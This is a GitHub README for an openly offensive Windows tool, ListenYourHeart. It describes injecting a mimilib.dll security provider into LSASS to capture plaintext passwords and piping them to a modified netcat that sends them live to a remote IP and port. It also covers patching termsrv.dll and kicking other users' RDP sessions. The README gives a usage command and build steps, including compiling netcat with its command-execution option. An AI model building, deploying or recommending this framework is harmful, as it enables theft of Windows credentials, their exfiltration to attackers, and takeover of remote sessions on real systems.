# ListenYourHeart 🔍

**An offensive security tool for real-time interception and exfiltrаtion of Windows credentials to a remote host.**
---

## ⚠️ Disclaimer  
This tool is intended for **authorized security testing and research purposes only**. Unauthorized use is illegal. Ensure you have explicit permission before deploying it in any environment.

---
## 📖 Overview  
ListenYourHeart is designed to  intercept Windows authentication credentials and exfiltrate them to a remote host in real-time. It operates as a modular framework, combining credential harvesting, data transmission, and offensive automation.

---

## 🧩 Core Components

### 1. **mimilib.dll** (Security Support Provider)
- **Purpose**: Acts as a Security Support Provider (SSP) to intercept authentication credentials (plaintext passwords only).
- **Mechanism**: Injects into the LSASS process and forwards captured credentials to `mefcat.exe` via a **named pipe** (`\\.\pipe\communicate`).

### 2. **mefcat.exe** (Modified Netcat)
- **Purpose**: Facilitates real-time data exfiltration.
- **Features**:
  - Communicates with `mimilib.dll` through a named pipe.
  - Uses **Windows Events** for synchronization.
  - Provides transmission to a remote host (IP/port configurable).

### 3. 🔧 **Offensive Scripts**
#### **KoH.bat** (King Of Hill)
  - **Function:** Terminates active RDP sessions except for the session matching the specified username.
#### **patchTermSrv.exe**
  - **Function**: Patches the `termsrv.dll` library to enable multiple RDP sessions on Windows.

## 🗣 Communication process
![communicationProc](https://github.com/user-attachments/assets/15415807-b76d-4e53-924c-64cb56592d22)

## Usage
```bash
ListenYourHeart.exe <REMOTE_IP> <REMOTE_PORT> [--patch] [--koh <USERNAME>]
```
### Options
`--patch` 

Enables multi-RDP sessions on the host by applying a PowerShell script to modify termSrv.dll . 

`--koh <USERNAME>` 

Activates "King of the Hill" mode: terminates all active RDP sessions except the one associated with the specified <USERNAME> via a batch script.
## 🛠️ Build  
---

### Building `mimilib.dll`  

#### Requirements  
Compile with **Microsoft Visual Studio 2017**  **v141 XP toolset** 


---

### Building `ListenYourHeart` (Core Project)  

Compile with **Microsoft Visual Studio 2022**  and C++17 support


   ⚠️ The following files **must be placed in the root directory** of your Visual Studio solution:
   - `mefcat.exe` (compiled binary)
   - `mimilib.dll` (compiled library)  
   - `KoH.bat` (session-kick script)
   - `patchTermSrv.exe` (RDP patcher)

---

### Building `mefcat.exe`  

#### Requirements  
- **MinGW-w64** compiler

#### Command  
```bash
x86_64-w64-mingw32-gcc.exe -DWIN32 -D_CONSOLE -DTELNET -DGAPING_SECURITY_HOLE \
  getopt.c doexec.c mefcat.c \
  -s -lkernel32 -luser32 -lwsock32 -lwinmm \
  -o mefcat.exe
```

## Example



https://github.com/user-attachments/assets/d7ac37e5-7875-43cb-bab5-b8c3f5e3eab1




